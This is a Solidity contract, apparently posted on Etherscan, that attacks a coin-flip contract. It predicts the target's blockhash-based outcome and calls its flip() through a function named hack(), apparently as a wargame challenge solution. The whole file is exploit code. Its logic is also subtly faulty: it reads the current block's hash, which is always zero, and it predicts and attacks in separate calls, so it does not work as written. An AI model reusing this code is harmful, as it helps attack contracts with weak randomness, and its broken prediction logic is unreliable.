/**
 *Submitted for verification at Etherscan.io on 2021-08-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
interface ICoin {
    function flip(bool _guess) external; 
}

contract NotFlip {
    ICoin public immutable contrato;
    
    constructor(address contract_add) {
        contrato = ICoin(contract_add);
    }

    uint256 lastHash;
    bool prediction;
    uint256 public consecutiveWins;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flipPre() public returns (bool) {
        lastHash = uint256(blockhash(block.number));
    
        uint256 coinFlip = lastHash/(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
  
    function predict() public returns (bool) {
        prediction = flipPre();
        return prediction;
    }
  
    function hack() public returns (bool) {
        contrato.flip(prediction);
        return true;
    }
}